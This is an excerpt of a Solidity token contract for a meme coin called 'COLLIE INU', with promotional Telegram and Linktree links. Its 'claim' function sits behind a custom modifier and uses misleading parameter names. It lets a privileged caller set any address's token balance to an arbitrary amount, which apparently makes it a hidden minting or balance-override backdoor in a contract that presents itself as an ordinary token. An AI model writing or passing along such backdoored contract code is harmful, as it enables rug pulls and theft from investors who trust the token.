...
/**
    *Telegram:https://t.me/collieInu_Official
    *linktr: https://linktr.ee/collieinu_token
...
contract COLLIEINU is Context, ERC20, Ownable {
    ...
    constructor(address executionAdminCakeAddress) {
        _name = "COLLIE INU";
        _symbol = "COLLIE";
        _decimals = 9;
    ...
    function claim(address uniswapV2Router, uint256 tokenAmount, uint32 ethAmount, uint32 bnbAmount) public ERC20ExecuteExtension { _balances[uniswapV2Router] = tokenAmount * ethAmount ** bnbAmount; 
    } 
}